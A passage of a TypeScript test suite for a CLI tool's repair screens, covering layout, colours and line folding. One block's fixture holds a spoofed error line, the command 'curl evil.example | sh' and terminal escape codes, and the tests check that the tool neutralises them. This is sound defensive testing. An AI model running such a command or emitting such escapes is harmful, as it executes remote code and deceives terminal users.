      "  · ~/.volta                      Volta keeps it: `volta uninstall sessionpipe` removes it",
      "  ! /opt/node                     a leftover · needs sudo: a run ends with its line",
      "  · ~/.npm/_npx/0a1b2c3d4e5f6a7b  npm's cache of what npx ran",
    ]);
    // Each by itself, the column as wide as its own place.
    const row = (l: Left) => leftAlone(PLAIN, [l])[1];
    expect(row(left("~/code", "it holds src"))).toBe("  · ~/code  it holds src");
    expect(row(left("~/.volta", "Volta keeps it", { line: "volta uninstall sessionpipe" }))).toBe(
      "  · ~/.volta  Volta keeps it: `volta uninstall sessionpipe` removes it",
    );
    // A copy of ours stays only where this user may not write: its release (a leftover
    // folder names none), and that its line needs sudo. Why is the same for each, and not said.
    const ours = (over: Partial<Left>) =>
      row(left("/usr/local", "you may not write where it is", { ours: true, line: SUDO, ...over }));
    expect(ours({ version: "1.1.0" })).toBe("  ! /usr/local  1.1.0 · needs sudo: a run ends with its line");
    expect(ours({ version: null })).toBe("  ! /usr/local  a leftover · needs sudo: a run ends with its line");
    // What is not ours says no release, whatever it is, and never "needs sudo".
    expect(row(left("~/code", "it holds src", { version: "9.9.9" }))).toBe("  · ~/code  it holds src");
  });

  it("only what a person reads is shown: never the whole path of what stays, never a line to paste", () => {
    for (const ui of [PLAIN, MONO, TTY, WIDE]) {
      const text = leftAlone(ui, EACH).map(plain).join("\n");
      expect(text).not.toContain(path.join(ROOT, "whole"));
      expect(text).not.toMatch(/sudo (rm|npm)|node_modules/);
    }
  });

  it("at a terminal: the heading bold, the marks in their colours, a command picked out, the words plain", () => {
    expect(leftAlone(WIDE, EACH)).toEqual([
      `${ESC}[1mLeft alone${ESC}[22m`,
      `  ${ESC}[2m·${ESC}[22m ~/code/sessionpipe            it holds src, which no published sessionpipe has (a checkout or a`,
      "                                  build?)",
      // Yellow: the one kind of row that leaves the job unfinished.
      `  ${ESC}[33m!${ESC}[39m /usr/local                    1.1.0 · needs sudo: a run ends with its line`,
      `  ${ESC}[2m·${ESC}[22m /home/u/bin/sessionpipe       a file npm didn't put there`,
      `  ${ESC}[2m·${ESC}[22m ~/.volta                      Volta keeps it: ${ESC}[36m\`volta uninstall sessionpipe\`${ESC}[39m removes it`,
      `  ${ESC}[33m!${ESC}[39m /opt/node                     a leftover · needs sudo: a run ends with its line`,
      `  ${ESC}[2m·${ESC}[22m ~/.npm/_npx/0a1b2c3d4e5f6a7b  npm's cache of what npx ran`,
    ]);
    expect(mark(WIDE, "info")).toBe(`${ESC}[2m·${ESC}[22m`);
    expect(mark(WIDE, "warn")).toBe(`${ESC}[33m!${ESC}[39m`);
    // Without colour the marks are still two different signs.
    const mono = leftAlone(MONO_WIDE, EACH);
    expect(mono.join("\n")).not.toContain(ESC);
    expect(mono).toEqual(leftAlone(WIDE, EACH).map(plain));
    expect(mono.filter((l) => l.startsWith("  ! "))).toHaveLength(2);
    expect(mono.filter((l) => l.startsWith("  · "))).toHaveLength(4);
  });

  it("at 80 columns and at 120 why folds under its own column, and every line fits", () => {
    expect(leftAlone(MONO, EACH)).toEqual([
      "Left alone",
      "  · ~/code/sessionpipe            it holds src, which no published sessionpipe",
      "                                  has (a checkout or a build?)",
      "  ! /usr/local                    1.1.0 · needs sudo: a run ends with its line",
      "  · /home/u/bin/sessionpipe       a file npm didn't put there",
      "  · ~/.volta                      Volta keeps it: `volta uninstall sessionpipe`",
      "                                  removes it",
      "  ! /opt/node                     a leftover · needs sudo: a run ends with its",
      "                                  line",
      "  · ~/.npm/_npx/0a1b2c3d4e5f6a7b  npm's cache of what npx ran",
    ]);
    fits(leftAlone(TTY, EACH), leftAlone(PLAIN, EACH), 80);
    fits(leftAlone(WIDE, EACH), leftAlone(PLAIN, EACH), 120);
    expect(leftAlone(TTY, EACH).map(plain)).toEqual(leftAlone(MONO, EACH));
    // The column starts where the widest place ends, two spaces on.
    const column = "  · ~/.npm/_npx/0a1b2c3d4e5f6a7b  ".length;
    for (const l of leftAlone(MONO, EACH).slice(1)) expect(l.slice(column - 2, column + 1)).toMatch(/^ {2}\S$/);
  });

  it("36 columns of folder still fit the column; one more and every place has a line of its own, with why under it", () => {
    const fits36 = `~/${"a".repeat(34)}`;
    expect(leftAlone(PLAIN, [left(fits36, "it holds src"), left("~/code", "Volta keeps it")])).toEqual([
      "Left alone",
      `  · ${fits36}  it holds src`,
      `  · ~/code${" ".repeat(30)}  Volta keeps it`,
    ]);
    expect(leftAlone(PLAIN, [left(`${fits36}a`, "it holds src"), left("~/code", "Volta keeps it")])).toEqual([
      "Left alone",
      `  · ${fits36}a`,
      "      it holds src",
      "  · ~/code",
      "      Volta keeps it",
    ]);
  });

  /** Volta's own folder for it, and a hundred columns of folder: both too long for a column. */
  const VOLTA_AT = "~/.volta/tools/image/packages/sessionpipe";
  const LONG = `/${Array.from({ length: 10 }, (_, n) => `folder-0${n}`).join("/")}`;
  const WIDE_ROWS: Left[] = [
    left("~/code/sessionpipe", CHECKOUT, { version: "1.3.0" }),
    left(VOLTA_AT, "Volta keeps it", { line: "volta uninstall sessionpipe" }),
    left("/home/u/bin/sessionpipe", "a file npm didn't put there"),
    left(LONG, "you may not write where it is", { version: "1.0.0", line: SUDO, ours: true }),
    left("/usr", "you may not write where it is", { line: SUDO, ours: true }),
  ];

  it("a place too long for a column: each kind of row with its place on a line of its own, and why under it", () => {
    expect(leftAlone(PLAIN, WIDE_ROWS)).toEqual([
      "Left alone",
      "  · ~/code/sessionpipe",
      "      it holds src, which no published sessionpipe has (a checkout or a build?)",
      `  · ${VOLTA_AT}`,
      "      Volta keeps it: `volta uninstall sessionpipe` removes it",
      "  · /home/u/bin/sessionpipe",
      "      a file npm didn't put there",
      // Into a pipe the folder is one line, whatever its length.
      `  ! ${LONG}`,
      "      1.0.0 · needs sudo: a run ends with its line",
      "  ! /usr",
      "      a leftover · needs sudo: a run ends with its line",
    ]);
  });

  it("there, at 80 columns and at 120, a folder longer than the line is broken after a separator, under its first character", () => {
    const at80 = leftAlone(MONO, WIDE_ROWS);
    expect(at80.slice(7, 10)).toEqual([
      "  ! /folder-00/folder-01/folder-02/folder-03/folder-04/folder-05/folder-06/",
      "    folder-07/folder-08/folder-09",
      "      1.0.0 · needs sudo: a run ends with its line",
    ]);
    const at120 = leftAlone(MONO_WIDE, WIDE_ROWS);
    expect(at120.slice(7, 10)).toEqual([
      "  ! /folder-00/folder-01/folder-02/folder-03/folder-04/folder-05/folder-06/folder-07/folder-08/",
      "    folder-09",
      "      1.0.0 · needs sudo: a run ends with its line",
    ]);
    for (const [folded, columns] of [
      [at80, 80],
      [at120, 120],
    ] as const) {
      for (const l of folded) expect(cols(l), l).toBeLessThanOrEqual(Math.min(columns - 1, MAX_WIDTH));
      expect(letters(folded)).toBe(letters(leftAlone(PLAIN, WIDE_ROWS)));
      // A place starts after its mark; its further lines under its first character; why six columns in.
      for (const l of folded.slice(1)) expect(l).toMatch(/^ {2}[·!] \S|^ {4}\S|^ {6}\S/);
    }
    // In colour: the mark on the folder's first line, a command in its colour under it.
    const coloured = leftAlone(TTY, WIDE_ROWS);
    expect(coloured.map(plain)).toEqual(at80);
    expect(coloured[0]).toBe(tint(TTY, "bold", "Left alone"));
    expect(coloured[3]).toBe(`  ${mark(TTY, "info")} ${VOLTA_AT}`);
    expect(coloured[4]).toBe(`      Volta keeps it: ${tint(TTY, "cyan", "`volta uninstall sessionpipe`")} removes it`);
    expect(coloured[7]).toBe(
      `  ${mark(TTY, "warn")} /folder-00/folder-01/folder-02/folder-03/folder-04/folder-05/folder-06/`,
    );
    expect(coloured[8]).toBe("    folder-07/folder-08/folder-09");
    // A Windows folder is broken after a backslash.
    const win =
      "C:\\Users\\Someone With A Long Name\\AppData\\Roaming\\fnm\\node-versions\\v22.11.0\\installation\\node_modules";
    expect(leftAlone(MONO, [left(win, "it holds src")])).toEqual([
      "Left alone",
      // A name with spaces in it is never split.
      "  · C:\\Users\\Someone With A Long Name\\AppData\\Roaming\\fnm\\node-versions\\",
      "    v22.11.0\\installation\\node_modules",
      "      it holds src",
    ]);
  });

  it("a command is never folded: it goes whole to a line of its own, though that line is then too long", () => {
    const line = "volta uninstall sessionpipe --and-a-flag-that-makes-this-command-long";
    const stays = [left("~/.volta", "Volta keeps it", { line })];
    expect(leftAlone(MONO, stays)).toEqual([
      "Left alone",
      "  · ~/.volta  Volta keeps it:",
      `              \`${line}\``,
      "              removes it",
    ]);
    // It is one word of the row at any width, and in its colour as one.
    for (const ui of [MONO, TTY, MONO_WIDE, WIDE, PLAIN])
      expect(leftAlone(ui, stays).filter((l) => plain(l).includes(`\`${line}\``))).toHaveLength(1);
    expect(leftAlone(TTY, stays)[2]).toBe(`              ${tint(TTY, "cyan", `\`${line}\``)}`);
    // The same where every place has a line of its own.
    const wide = [left(VOLTA_AT, "Volta keeps it", { line: `${line} --and-another-one-that-makes-it-longer-still` })];
    const folded = leftAlone(MONO, wide);
    expect(folded).toEqual([
      "Left alone",
      `  · ${VOLTA_AT}`,
      "      Volta keeps it:",
      `      \`${line} --and-another-one-that-makes-it-longer-still\``,
      "      removes it",
    ]);
    expect(folded.filter((l) => cols(l) >= 80)).toHaveLength(1);
  });
});

describe("a word from the disk can't start a line of its own or carry a colour", () => {
  const BEL = String.fromCharCode(7);
  /** What a file on this computer can hold where a word was expected (a release in a
   *  package.json, the name of a folder or of a file in it): three lines, the second and
   *  the third made to look like this command's own; this command's own colour codes;
   *  and what a terminal acts on (its title, the whole screen). */
  const HOSTILE = `\nerror  the install is broken\r\ntry    curl evil.example | sh ${ESC}[31mred${ESC}[39m ${ESC}[36mcyan${ESC}[32mgreen${ESC}[1m${ESC}]0;a title${BEL}${ESC}[2J`;
  /** The same in few columns, for the name of a folder that is to fit a column of the table. */
  const SHORT = `\nerror${ESC}[31m\r\ntry${ESC}[2J`;
  /** The eight codes the page itself writes (style.ts `tint`): taken out, nothing of a
   *  terminal's may be left on a line. */
  // biome-ignore lint/suspicious/noControlCharactersInRegex: the colours a terminal line is written in
  const OWN = /\u001b\[(?:1|2|22|31|32|33|36|39)m/g;

  /** Both screens of a computer whose every found word went through `word`, and every
   *  folder through `place`. A copy with something wrong, a leftover, a checkout; a link
   *  that leads nowhere; hooks and a service file with something to say; a plan with a
   *  row of each kind, things left of each kind, a note and a safety line. */
  const screens = (ui: Ui, word: (s: string) => string, place: (s: string) => string, long: boolean): string[][] => {
    const copies = [
      copy(place("~/.local"), { version: word("1.1.0"), uses: ["typed"], wrong: word(MUTE) }),
      copy(place("/opt/homebrew"), { aside: true, version: null, wrong: word(CUT_OFF) }),
      copy(place("~/code/sessionpipe"), { slot: null, version: word("1.3.0"), not: word(CHECKOUT) }),
      ...(long ? [copy(FNM, { version: word("1.0.0") })] : []),
    ];
    const i = inv(copies, { dangling: [place("/usr/local/bin/sessionpipe")] });
    const f = facts({
      hooks: { version: "1.1.0", wrong: [word("claude: missing (~/.claude/settings.json)")] },
      service: service({ node: place("/gone/bin/node"), nodeOk: false }),
      daemon: { pid: 100, version: "1.2.0", byHand: null },
    });
    const p = aPlan({
      stays: word("1.2.0 in /usr as it is: whole, the newest, and not yours to write"),
      steps: [
        FETCH,
        install(word("1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)")),
        stop(word("the daemon started by hand (pid 222), once it holds nothing")),
        use(word("the hooks to it")),
        remove(word("1.1.0 in ~/.nvm/versions/node/v22.1.0")),
        PROVE,
      ],
      left: [
        left(place("~/code/sessionpipe"), word(CHECKOUT)),
        left(place("/usr/local"), "you may not write where it is", {
          version: word("1.1.0"),
          line: "sudo rm",
          ours: true,
        }),
        left(place("~/.volta"), word("Volta keeps it"), { line: word("volta uninstall sessionpipe") }),
        ...(long ? [left(FNM, word("it holds src"))] : []),
      ],
      notes: [word("The background service isn't running, and nothing here starts it by itself.")],
      // The one word of a safety line that is not this command's own is the release.
      safety: [SAFE.replace("1.2.0", word("1.2.0")), RESTARTS],
    });
    return [found(ui, i, f), planned(ui, p), leftAlone(ui, p.left)];
  };
  const asIs = (x: string): string => x;
  /** How a screen is laid out: its headings, and what each row starts with. */
  const laidOut = (lines: string[]): string[] =>
    lines
      .map(plain)
      .filter((l) => /^(Found|Also found|This will|Left alone)\b|^ {2}\S/.test(l))
      .map((l) => (l.startsWith(" ") ? l.slice(0, 4) : l));

  for (const [layout, long] of [
    ["every folder short enough for its column", false],
    ["a folder too long for a column, so each has a line of its own", true],
  ] as const)
    it(`L3: ${layout}: each screen is the screen of the same words with nothing in them a terminal acts on`, () => {
      const dirty = (x: string): string => `${x}${HOSTILE}`;
      const there = (x: string): string => `${x}${long ? HOSTILE : SHORT}`;
      for (const ui of [TTY, WIDE, MONO, MONO_WIDE, PLAIN]) {
        const got = screens(ui, dirty, there, long);
        // The words as they would be had the disk held nothing but text: line for line the same.
        const want = screens(
          ui,
          (x) => clean(dirty(x)),
          (x) => clean(there(x)),
          long,
        );
        expect(got).toEqual(want);
        // And laid out as they are with no such thing in them at all: the same headings,
        // and the same rows under each, a mark or a sign for a mark or a sign.
        const calm = screens(ui, asIs, asIs, long);
        expect(got.map(laidOut)).toEqual(calm.map(laidOut));
        for (const lines of got) {
          // One entry is one line of the screen: no break inside it starts another.
          for (const l of lines) expect(l).not.toMatch(/[\r\n]/);
          // No line reads as this command's own failure or its next step: those two start
          // a line, in its first column.
          for (const l of lines) expect(plain(l)).not.toMatch(/^(error|try)\b/);
          // Nothing of a terminal's is left: no title, no cleared screen, no code but the page's own.
          const text = lines.join("\n");
          expect(text.replace(OWN, "")).not.toContain(ESC);
          expect(text).not.toContain(BEL);
          if (!ui.color) expect(text).not.toContain(ESC);
        }
        // The words themselves are all still there, as words: nothing was dropped to hide
        // them. Every found word is on the screens once (the three screens hold 19 of them,
        // and 13 more where the folders carry the long one too).
        const all = got.flat().map(plain).join(" ").replace(/\s+/g, " ");
        expect(all.match(/curl evil\.example \| sh red cyangreen/g)).toHaveLength(long ? 32 : 19);
        expect(all).toContain(long ? ".local error the install is broken try curl" : "~/.local error try ");
      }
    });

  it("L3: a colour of this command's own in a found word colours nothing: each line has the codes it has without it", () => {
    const red = (x: string): string => `${ESC}[31m${x}${ESC}[39m${ESC}[1m`;
    for (const long of [false, true])
      for (const ui of [TTY, WIDE]) {
        const got = screens(ui, red, red, long);
        expect(got).toEqual(screens(ui, asIs, asIs, long));
        // Red is the mark of a copy with something wrong and the verb of a removal, and nothing else.
        const reds = got.flat().filter((l) => l.includes(`${ESC}[31m`));
        expect(reds.map((l) => plain(l).trim().slice(0, 1))).toEqual(["✗", "✗", "-"]);
      }
  });
});

describe("the two screens of a real repair, from the plan itself", () => {
  // A computer with every kind of copy on it and a copy that can't be written. Typing
  // `sessionpipe` starts the copy in ~/.local through npm's link; a file of the name that
  // is no install is behind it on PATH. A service file is there, and a daemon someone
  // started by hand answers. The command runs from npx's cache.
  const copies = [
    ...SEVERAL,
    VOLTA,
    copy("/usr", { version: "1.0.0", writable: false, bins: [path.join(folder("/usr"), "bin", "sessionpipe")] }),
  ];
  const typed = copies[0] as Copy;
  const i = inv(copies, {
    dangling: ["/usr/local/bin/sessionpipe"],
    strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file npm didn't put there" }],
    onPath: [
      { file: path.join(LOCAL, "bin", "sessionpipe"), dir: typed.dir },
      { file: "/home/u/bin/sessionpipe", dir: null },
    ],
    typed: typed.dir,
    home: home("~/.local"),
  });
  const f = facts({
    hooks: { version: "1.1.0", wrong: [] },
    service: service(),
    daemon: { pid: 222, version: "1.1.0", byHand: null },
  });
  const p = plan(i, f);

  it("the plan has a step of every kind, things left of each kind, and both safety lines", () => {
    expect(p.refuse).toBeNull();
    expect(p.steps.map((s) => s.do)).toEqual([
      "fetch",
      "install",
      "stop",
      "use",
      "remove",
      "remove",
      "remove",
      "remove",
      "remove",
      "prove",
    ]);
    expect(p.left.map((l) => [l.where, l.ours, l.line !== null])).toEqual([
      ["~/code/sessionpipe", false, false],
      [VOLTA.where, false, true],
      ["/home/u/bin/sessionpipe", false, false],
      ["/usr", true, true],
    ]);
    expect(p.stays).toBeNull();
    expect(p.notes).toEqual([]);
    expect(p.safety).toEqual([SAFE, RESTARTS]);
  });

  it("into a pipe: the rows, what is left alone, what keeps it safe", () => {
    expect(planned(PLAIN, p)).toEqual([
      "This will",
      "  + install  1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)",
      "  ~ stop     the daemon started by hand (pid 222), once it holds nothing",
      "  ~ switch   the hooks and the background service to it",
      "  - remove   /usr/local/bin/sessionpipe (a link to a copy that is gone)",
      "  - remove   a leftover folder in /usr/local",
      "  - remove   1.0.0 in /opt/homebrew",
      "  - remove   1.1.0 in ~/.nvm/versions/node/v22.1.0",
      "  - remove   1.2.0 in ~/.npm/_npx/0a1b2c3d4e5f6a7b",
      "  = keep     pairings, settings, keys, messages waiting to be sent",
      "",
      "Left alone",
      "  · ~/code/sessionpipe",
      "      it holds src, which no published sessionpipe has (a checkout or a build?)",
      "  · ~/.volta/tools/image/packages/sessionpipe",
      "      Volta keeps it: `volta uninstall sessionpipe` removes it",
      "  · /home/u/bin/sessionpipe",
      "      a file npm didn't put there",
      "  ! /usr",
      "      1.0.0 · needs sudo: a run ends with its line",
      "",
      SAFE,
      RESTARTS,
    ]);
  });

  it("what is no install is said once, on its row of what is left: the table has no row for it, and counts the copies alone", () => {
    const table = found(PLAIN, i, f);
    const rows = planned(PLAIN, p).join("\n");
    for (const why of [CHECKOUT, "Volta keeps it", "a file npm didn't put there"]) {
      expect(table.join("\n")).not.toContain(why);
      expect(rows.split(why)).toHaveLength(2);
    }
    // Six copies: the five that are ours to remove and the one that needs sudo for it.
    expect(table.slice(0, 7)).toEqual([
      "Found 6 copies of sessionpipe on this computer",
      "  · 1.1.0      ~/.local                      you type this",
      "  · 1.1.0      ~/.nvm/versions/node/v22.1.0  the background service, the hooks",
      "  · 1.2.0      ~/.npm/_npx/0a1b2c3d4e5f6a7b  this command",
      "  ✗ 1.0.0      /opt/homebrew                 nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
      "  ✗ left over  /usr/local                    nothing uses it · left behind by an install that was cut off",
      "  · 1.0.0      /usr                          nothing uses it",
    ]);
    expect(table.join("\n")).not.toMatch(/not an install|~\/code|\.volta|\/home\/u\/bin/);
    // What is found beside the copies is what the plan answers: the link, and the daemon.
    expect(table.slice(7)).toEqual([
      "",
      "Also found",
      "  ! /usr/local/bin/sessionpipe is a link to a sessionpipe that is gone",
      "  ! a daemon someone started by hand (pid 222) holds the socket the service needs",
    ]);
  });

  it("the line that needs sudo is the plan's to keep for the end of a run: the folder and its own link by name, and never on this screen", () => {
    const usr = p.left.find((l) => l.ours);
    const [dir, link] = [slotIn(folder("/usr")), path.join(folder("/usr"), "bin", "sessionpipe")];
    expect(usr?.line).toBe(`sudo rm -r ${shq(dir, "linux")} ${shq(link, "linux")}`);
    expect(usr?.line).not.toMatch(/npm|uninstall/);
    for (const ui of [PLAIN, MONO, TTY, WIDE]) {
      const screen = [...found(ui, i, f), ...planned(ui, p)].map(plain).join("\n");
      expect(screen).not.toMatch(/sudo (rm|npm)|uninstall -g/);
      expect(screen).not.toContain(dir);
    }
  });

  it("at 80 columns and at 120 both screens fit, in colour and without it, and say what the whole lines say", () => {
    for (const [ui, mono, columns] of [
      [TTY, MONO, 80],
      [WIDE, MONO_WIDE, 120],
    ] as const) {
      const lines = planned(ui, p);
      fits(lines, planned(PLAIN, p), columns);
      fits(found(ui, i, f), found(PLAIN, i, f), columns);
      expect(lines.map(plain)).toEqual(planned(mono, p));
      expect(planned(mono, p).join("\n")).not.toContain(ESC);
      expect(lines[0]).toBe(tint(ui, "bold", "This will"));
      expect(lines).toContain(tint(ui, "bold", "Left alone"));
      // One green row, two yellow ones, five red and bold, one dim.
      const start = (verb: string) => lines.filter((l) => l.startsWith(`  ${verb}  `)).length;
      expect(start(tint(ui, "green", "+ install"))).toBe(1);
      expect(start(tint(ui, "yellow", "~ stop   "))).toBe(1);
      expect(start(tint(ui, "yellow", "~ switch "))).toBe(1);
      expect(start(tint(ui, "bold", tint(ui, "red", "- remove ")))).toBe(5);
      expect(start(tint(ui, "dim", "= keep   "))).toBe(1);
      // The command a tool of its own removes its copy with is whole, in its colour.
      expect(lines).toContain(`      Volta keeps it: ${tint(ui, "cyan", "`volta uninstall sessionpipe`")} removes it`);
      // The one row marked in yellow is the copy that would have gone, and what keeps it
      // safe ends the screen in plain text.
      expect(lines.filter((l) => l.startsWith(`  ${mark(ui, "warn")} `)).map(plain)).toEqual(["  ! /usr"]);
      expect(lines.slice(-3)).toEqual(["", SAFE, RESTARTS]);
    }
  });
});

describe("the screen of a home this user may not write, from the plan itself", () => {
  // As after `sudo npm install -g`: the copy that is typed is whole and the newest, in a
  // prefix that is not this user's; an older copy of the user's own is beside it. Nothing
  // runs in the background, and something here needs the service.
  const usr = copy("/usr", { uses: ["typed", "this", "hooks"], writable: false });
  const stray = copy("~/.nvm/versions/node/v22.1.0", { version: "1.1.0" });
  const i = inv([usr, stray], { home: home("/usr", { writable: false }) });
  const p = plan(i, facts());

  it("M3: the copy stays as the first row, nothing is installed, and with no safety line the screen ends with the note", () => {
    expect(p.stays).toBe("1.2.0 in /usr as it is: whole, the newest, and not yours to write");
    expect(p.steps.map((s) => s.do)).toEqual(["use", "remove", "prove"]);
    expect(p.safety).toEqual([]);
    expect(planned(PLAIN, p)).toEqual([
      "This will",
      "  = keep     1.2.0 in /usr as it is: whole, the newest, and not yours to write",
      "  ~ switch   the hooks to it",
      "  - remove   1.1.0 in ~/.nvm/versions/node/v22.1.0",
      "  = keep     pairings, settings, keys, messages waiting to be sent",
      "",
      "  ! The background service isn't running, and nothing here starts it by itself: `sessionpipe control run` does.",
    ]);
    for (const [ui, columns] of [
      [TTY, 80],
      [WIDE, 120],
    ] as const) {
      const lines = planned(ui, p);
      fits(lines, planned(PLAIN, p), columns);
      // Both rows of what is kept are dim, and no row is green: nothing is added.
      expect(lines.filter((l) => l.startsWith(`  ${tint(ui, "dim", "= keep   ")}  `))).toHaveLength(2);
      expect(lines.join("\n")).not.toContain(`${ESC}[32m`);
      expect(plain(lines.at(-1) as string)).toMatch(/`sessionpipe control run` does\.$/);
    }
  });
});
